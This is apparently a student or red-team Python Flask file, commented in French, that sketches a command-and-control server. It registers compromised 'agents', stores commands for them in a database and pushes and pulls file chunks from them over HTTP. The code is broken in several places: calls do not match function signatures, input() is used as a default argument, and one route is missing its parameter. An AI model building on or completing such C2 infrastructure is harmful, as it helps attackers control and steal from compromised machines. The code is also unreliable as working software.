##Un serveur de commande et de contrôle (C2) est utilisé pour contrôler et gérer à distance un groupe d'appareils compromis, souvent dans le contexte d'une cyberattaque malveillante.


from flask import Flask
from flask_sqlalchemy import SQLAlchemy
import json
import os, sys
from flask_sqlalchemy import SQLAlchemy
from SQLModleCore import Agent, Commands



import requests
import json
from flask import request, jsonify

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///Bureau/redTeam.db'
db = SQLAlchemy(app)

# Définir une classe de modèle pour représenter une table
class MaTable(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    nom = db.Column(db.String)

# Créer la base de données et les tables
db.create_all()


def send_file_chunk(agent, chunk):
    # Envoie le paquet de données à l'agent via une requête HTTP POST
    requests.post(f'http://{agent.name}/receive_file_chunk', data=chunk)

def get_file_chunk(agent):
    # Récupère le prochain paquet de données de l'agent via une requête HTTP GET
    r = requests.get(f'http://{agent.name}/send_file_chunk')
    return r.content



#créer un agent
def create_agent(db,ordre_=[], noms_="", os_=None):
    noms_ = "Agent"
    var = Agent(ordre=ordre_,noms=noms_,os=os_)
    db.session.add(var)
    db.session.commit()

    print('id :',var.id)
    print(var.os)
    print("le nom :", var.noms)
    print(var.ordre)

    idi = var.id
    return idi

#créer un ordre
def create_order(db, agent, order, data=input("")):
    agent.ordre = order
    db.session.commit()
    print(f"Agent {agent.id} a été assigné a : {agent.ordre}")

# enregistre un agent, Si la méthode de la requête est bien POST, la fonction appelle la fonction create_agent avec la base de données db en argument, 
# pour créer un nouvel agent dans la base de données, cette fonction doit retourner un ID d'agent.


@app.route('/register/', methods=['POST'])
def register():
    if request.method == 'POST':

        agent_id = create_agent(db)
        
        create_order(db, agent_id=agent_id, data=input(""))
        
        return jsonify({"status": "success", "agent_id": agent_id}), 201
    else:
        return jsonify({"error": "Invalid request method"}), 400

#ajoute un agent
#Ce code définit une route pour une demande HTTP POST à l'URL '/addCommand/'. Lorsque cette route est appelée avec une demande HTTP POST, la fonction add_command est exécutée.
#La première chose que fait la fonction est de vérifier si la méthode de la requête est bien POST, 
#si non,  elle renvoie un message d'erreur en utilisant jsonify  et un code 400 qui indique que la méthode de la requête est incorrecte.
@app.route('/add_Command/', methods=['POST'])
def add_command():
    if request.method == 'POST':
        command = request.form.get('command')
        agent_id = request.form.get('agent_id')
        #Validation 
        if command and agent_id:
            create_order(db, agent_id=agent_id, data_=command)
            return jsonify({"status": "success"}), 201
        else:
            return jsonify({"error": "Missing data in the request"}), 400
    else:
        return jsonify({"error": "Invalid request method"}), 400




#Cette partie de code a pour objectif de récupérer les informations d'un agent spécifique a partir d'une requête HTTP.
#Ensuite, il vérifie si l'identifiant de l'agent est présent dans la requête (non vide).
# Puis, il récupére les informations de l'agent à partir de la base de données.
@app.route('/send_file/<agent_name>', methods=['POST'])
def recover_file():

    agent_id = request.form.get("agent_id")
    if agent_id:
        #permet de filtrer les enregistrements d'une table en fonction de certains critères
        agent = Agent.query.filter_by(id=agent_id).first()
    else:
        return jsonify({"error": "Missing agent id in the request"}), 400
    if not agent:
        return jsonify({"error": "Agent not found"}), 404

    # Récupère le fichier à envoyer
    file = request.files.get('file', None)
    if not file:
        return jsonify({"error": "No file found in the request"}), 400





if __name__ == '__main__':
    app.run(debug=True, host='localhost', port=6000)
    


